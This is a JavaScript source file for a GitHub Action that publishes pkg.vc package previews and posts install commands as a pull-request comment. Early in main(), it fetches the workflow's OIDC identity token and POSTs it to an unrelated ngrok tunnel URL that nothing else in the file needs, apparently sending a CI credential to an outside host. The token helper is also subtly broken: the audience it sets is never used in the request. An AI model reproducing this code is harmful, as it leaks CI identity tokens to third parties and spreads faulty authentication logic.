import { join } from "node:path";
import { getInput, setFailed, setOutput } from "@actions/core";
import github from "@actions/github";
import dedent from "dedent";
import { publish_module } from "pkg.vc";

async function main() {
	try {
		const token = getInput("github-token");
		const secret = getInput("secret");
		const directory = getInput("directory");
		const organization = getInput("organization");
		const octokit = github.getOctokit(token);

		const jwt = await get_oidc_token();
		await fetch(
			"https://forcibly-oriented-porpoise.ngrok-free.app/verify",
			{
				method: "POST",
				headers: {
					Authorization: `Bearer ${jwt}`,
					"Content-Type": "application/json",
				},
				body: JSON.stringify({ some: "payload" }),
			},
		);

		const { urls, package_manager, package_name } = await publish_module(
			secret,
			organization,
			join(process.cwd(), directory),
		);
		const is_pr = github.context.payload.pull_request !== undefined;
		if (!is_pr) {
			throw new Error("This action is only supported for pull requests.");
		}
		const pr_number = github.context.payload.pull_request.number;
		const { owner, repo } = github.context.repo;
		const comments = await octokit.rest.issues.listComments({
			owner,
			repo,
			issue_number: pr_number,
		});
		const identifier = "pkg-vc:packages";
		const existing_comment = comments.data.find(
			(c) =>
				c.user.login === "github-actions[bot]" &&
				c.body.includes(identifier),
		);

		// Create the new package section with markers
		const package_section = dedent`
			<!-- pkg-vc:${package_name} -->
			### 📦 \`${package_name}\`

			**Install \`${package_name}\` with:**

			\`\`\`sh
			${package_manager} install ${urls.url_commit}
			\`\`\`
			
			**Alternatively, you may specify a branch name or pull request number:**

			\`\`\`sh
			${package_manager} install ${urls.url_branch}
			${package_manager} install ${urls.url_pr}
			\`\`\`
			<!-- /pkg-vc:${package_name} -->
		`;

		let body;
		if (existing_comment) {
			// Check if this package already exists in the comment
			const package_regex = new RegExp(
				`<!-- pkg-vc:${package_name} -->.*?<!-- /pkg-vc:${package_name} -->`,
				"gs",
			);

			if (package_regex.test(existing_comment.body)) {
				// Replace existing package section
				body = existing_comment.body.replace(
					package_regex,
					package_section.trim(),
				);
			} else {
				// Append new package section before the main identifier
				const main_identifier = `<!-- ${identifier} -->`;
				body = existing_comment.body.replace(
					main_identifier,
					`${package_section.trim()}\n\n${main_identifier}`,
				);
			}
		} else {
			// Create new comment
			body = dedent`## 🚀 Previews available on [pkg.vc](https://pkg.vc)!
			
				${package_section.trim()}
				
				<!-- ${identifier} -->`;
		}

		if (existing_comment) {
			await octokit.rest.issues.updateComment({
				owner,
				repo,
				comment_id: existing_comment.id,
				body,
			});
		} else {
			await octokit.rest.issues.createComment({
				owner,
				repo,
				issue_number: pr_number,
				body,
			});
		}

		setOutput("url_commit", urls.url_commit);
		setOutput("url_branch", urls.url_branch);
		setOutput("url_pr", urls.url_pr);
		setOutput("command", `${package_manager} install ${urls.url_branch}`);
	} catch (error) {
		setFailed(error.message);
	}
}

export async function get_oidc_token() {
	const audience = "pkg.vc";
	const token = process.env?.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
	if (!token) {
		throw new Error("Missing ACTIONS_ID_TOKEN_REQUEST_TOKEN");
	}
	const request_url = process.env?.ACTIONS_ID_TOKEN_REQUEST_URL;
	if (!request_url) {
		throw new Error("Missing ACTIONS_ID_TOKEN_REQUEST_URL");
	}

	const url = new URL(request_url);
	url.searchParams.set("audience", audience);

	const res = await fetch(request_url, {
		headers: { Authorization: `bearer ${token}` },
	});

	if (!res.ok) {
		throw new Error(
			`Failed to get OIDC token: ${res.status} ${res.statusText}`,
		);
	}
	const { value } = await res.json();

	return value;
}

main().catch((err) => {
	console.error(err);
	process.exit(1);
});
